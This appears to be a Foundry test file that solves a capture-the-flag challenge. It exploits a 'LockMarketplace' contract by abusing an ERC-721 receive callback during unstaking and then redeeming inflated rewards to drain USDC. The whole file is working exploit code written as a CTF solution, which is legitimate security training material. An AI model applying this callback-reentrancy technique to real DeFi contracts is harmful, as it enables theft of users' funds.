// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "lib/forge-std/src/Test.sol";
import "lib/forge-std/src/Vm.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "src/LockMarketplace.sol";
import "src/LockToken.sol";
import "src/Challenge.sol";

contract Solve is Test {

    Challenge challenge;
    IERC20 usdc;
    IERC20 cusdc;
    LockMarketplace lockMarketplace;
    LockToken lockToken;

    bool active;


    function test_solve() public {
        challenge = new Challenge(address(this));
        vm.prank(0x37305B1cD40574E4C5Ce33f8e8306Be057fD7341);
        IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48).transfer(address(challenge), 1_000_520e6);
        challenge.deploy();


        usdc = challenge.USDC();
        cusdc = challenge.CUSDC();
        lockMarketplace = challenge.LOCK_MARKETPLACE();
        lockToken = challenge.LOCK_TOKEN();

        vm.startPrank(challenge.PLAYER());
        usdc.transfer(address(this), usdc.balanceOf(challenge.PLAYER()));
        vm.stopPrank();

        usdc.approve(address(lockMarketplace), type(uint).max);
        uint nftId = lockMarketplace.mintWithUSDC(address(this), 120e6);
        lockMarketplace.withdrawUSDC(nftId, 70e6);
        lockToken.approve(address(lockMarketplace), nftId);
        lockMarketplace.stake(nftId, 30e6);

        active = true;
        lockMarketplace.unStake(address(this), nftId);

        nftId = lockMarketplace.mintWithUSDC(address(this), 120e6);
        lockMarketplace.withdrawUSDC(nftId, 100e6);
        lockMarketplace.redeemCompoundRewards(nftId, lockMarketplace.getAvailableRewards(address(this)));

        usdc.transfer(address(challenge.PLAYER()), usdc.balanceOf(address(this)));

        console.log(challenge.isSolved());
    }

    function onERC721Received(address, address, uint256 id, bytes calldata) external returns (bytes4) {
        if (active) {
            lockToken.transferFrom(address(this), address(challenge), id);
            active = false;
        }
        return this.onERC721Received.selector;
    }
}